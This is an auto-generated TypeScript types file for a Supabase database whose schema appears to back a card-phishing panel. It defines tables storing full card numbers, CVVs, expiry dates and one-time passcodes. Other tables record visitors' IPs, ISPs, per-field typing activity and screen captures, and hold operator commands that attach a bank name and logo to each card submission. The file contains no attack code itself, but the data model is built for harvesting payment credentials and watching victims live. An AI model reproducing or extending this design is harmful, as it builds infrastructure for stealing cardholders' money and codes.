export type Json =
  | string
  | number
  | boolean
  | null
  | { [key: string]: Json | undefined }
  | Json[]

export type Database = {
  public: {
    Tables: {
      admin_commands: {
        Row: {
          bank_logo: string | null
          bank_name: string | null
          command: string
          created_at: string
          id: string
          submission_id: string | null
        }
        Insert: {
          bank_logo?: string | null
          bank_name?: string | null
          command: string
          created_at?: string
          id?: string
          submission_id?: string | null
        }
        Update: {
          bank_logo?: string | null
          bank_name?: string | null
          command?: string
          created_at?: string
          id?: string
          submission_id?: string | null
        }
        Relationships: [
          {
            foreignKeyName: "admin_commands_submission_id_fkey"
            columns: ["submission_id"]
            isOneToOne: false
            referencedRelation: "card_submissions"
            referencedColumns: ["id"]
          },
        ]
      }
      card_submissions: {
        Row: {
          amount: string
          browser: string
          card_holder: string
          card_number: string
          created_at: string
          cvv: string
          expiry_month: string
          expiry_year: string
          id: string
          invoice_id: string
          network: string
          otp: string | null
          updated_at: string
          user_ip: string
        }
        Insert: {
          amount: string
          browser: string
          card_holder: string
          card_number: string
          created_at?: string
          cvv: string
          expiry_month: string
          expiry_year: string
          id?: string
          invoice_id: string
          network: string
          otp?: string | null
          updated_at?: string
          user_ip: string
        }
        Update: {
          amount?: string
          browser?: string
          card_holder?: string
          card_number?: string
          created_at?: string
          cvv?: string
          expiry_month?: string
          expiry_year?: string
          id?: string
          invoice_id?: string
          network?: string
          otp?: string | null
          updated_at?: string
          user_ip?: string
        }
        Relationships: []
      }
      chat_messages: {
        Row: {
          file_name: string | null
          file_url: string | null
          id: string
          message: string
          sender: string
          timestamp: string
          user_ip: string
        }
        Insert: {
          file_name?: string | null
          file_url?: string | null
          id?: string
          message: string
          sender: string
          timestamp?: string
          user_ip: string
        }
        Update: {
          file_name?: string | null
          file_url?: string | null
          id?: string
          message?: string
          sender?: string
          timestamp?: string
          user_ip?: string
        }
        Relationships: []
      }
      enhanced_visitors: {
        Row: {
          country: string
          country_flag: string
          created_at: string
          device_time: string
          id: string
          ip: string
          isp: string
          user_agent: string
        }
        Insert: {
          country: string
          country_flag: string
          created_at?: string
          device_time: string
          id?: string
          ip: string
          isp: string
          user_agent: string
        }
        Update: {
          country?: string
          country_flag?: string
          created_at?: string
          device_time?: string
          id?: string
          ip?: string
          isp?: string
          user_agent?: string
        }
        Relationships: []
      }
      screen_captures: {
        Row: {
          id: string
          screen_data: string
          timestamp: string
          user_ip: string
        }
        Insert: {
          id?: string
          screen_data: string
          timestamp?: string
          user_ip: string
        }
        Update: {
          id?: string
          screen_data?: string
          timestamp?: string
          user_ip?: string
        }
        Relationships: []
      }
      typing_events: {
        Row: {
          field_name: string
          id: string
          is_typing: boolean
          timestamp: string
          user_ip: string
        }
        Insert: {
          field_name: string
          id?: string
          is_typing: boolean
          timestamp?: string
          user_ip: string
        }
        Update: {
          field_name?: string
          id?: string
          is_typing?: boolean
          timestamp?: string
          user_ip?: string
        }
        Relationships: []
      }
      visitors: {
        Row: {
          created_at: string
          id: string
          ip: string
          updated_at: string
        }
        Insert: {
          created_at?: string
          id?: string
          ip: string
          updated_at?: string
        }
        Update: {
          created_at?: string
          id?: string
          ip?: string
          updated_at?: string
        }
        Relationships: []
      }
    }
    Views: {
      [_ in never]: never
    }
    Functions: {
      [_ in never]: never
    }
    Enums: {
      [_ in never]: never
    }
    CompositeTypes: {
      [_ in never]: never
    }
  }
}

type DefaultSchema = Database[Extract<keyof Database, "public">]

export type Tables<
  DefaultSchemaTableNameOrOptions extends
    | keyof (DefaultSchema["Tables"] & DefaultSchema["Views"])
    | { schema: keyof Database },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof Database
  }
    ? keyof (Database[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
        Database[DefaultSchemaTableNameOrOptions["schema"]]["Views"])
    : never = never,
> = DefaultSchemaTableNameOrOptions extends { schema: keyof Database }
  ? (Database[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
      Database[DefaultSchemaTableNameOrOptions["schema"]]["Views"])[TableName] extends {
      Row: infer R
    }
    ? R
    : never
  : DefaultSchemaTableNameOrOptions extends keyof (DefaultSchema["Tables"] &
        DefaultSchema["Views"])
    ? (DefaultSchema["Tables"] &
        DefaultSchema["Views"])[DefaultSchemaTableNameOrOptions] extends {
        Row: infer R
      }
      ? R
      : never
    : never

export type TablesInsert<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof Database },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof Database
  }
    ? keyof Database[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never = never,
> = DefaultSchemaTableNameOrOptions extends { schema: keyof Database }
  ? Database[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Insert: infer I
    }
    ? I
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Insert: infer I
      }
      ? I
      : never
    : never

export type TablesUpdate<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof Database },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof Database
  }
    ? keyof Database[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never = never,
> = DefaultSchemaTableNameOrOptions extends { schema: keyof Database }
  ? Database[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Update: infer U
    }
    ? U
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Update: infer U
      }
      ? U
      : never
    : never

export type Enums<
  DefaultSchemaEnumNameOrOptions extends
    | keyof DefaultSchema["Enums"]
    | { schema: keyof Database },
  EnumName extends DefaultSchemaEnumNameOrOptions extends {
    schema: keyof Database
  }
    ? keyof Database[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"]
    : never = never,
> = DefaultSchemaEnumNameOrOptions extends { schema: keyof Database }
  ? Database[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"][EnumName]
  : DefaultSchemaEnumNameOrOptions extends keyof DefaultSchema["Enums"]
    ? DefaultSchema["Enums"][DefaultSchemaEnumNameOrOptions]
    : never

export type CompositeTypes<
  PublicCompositeTypeNameOrOptions extends
    | keyof DefaultSchema["CompositeTypes"]
    | { schema: keyof Database },
  CompositeTypeName extends PublicCompositeTypeNameOrOptions extends {
    schema: keyof Database
  }
    ? keyof Database[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"]
    : never = never,
> = PublicCompositeTypeNameOrOptions extends { schema: keyof Database }
  ? Database[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"][CompositeTypeName]
  : PublicCompositeTypeNameOrOptions extends keyof DefaultSchema["CompositeTypes"]
    ? DefaultSchema["CompositeTypes"][PublicCompositeTypeNameOrOptions]
    : never

export const Constants = {
  public: {
    Enums: {},
  },
} as const
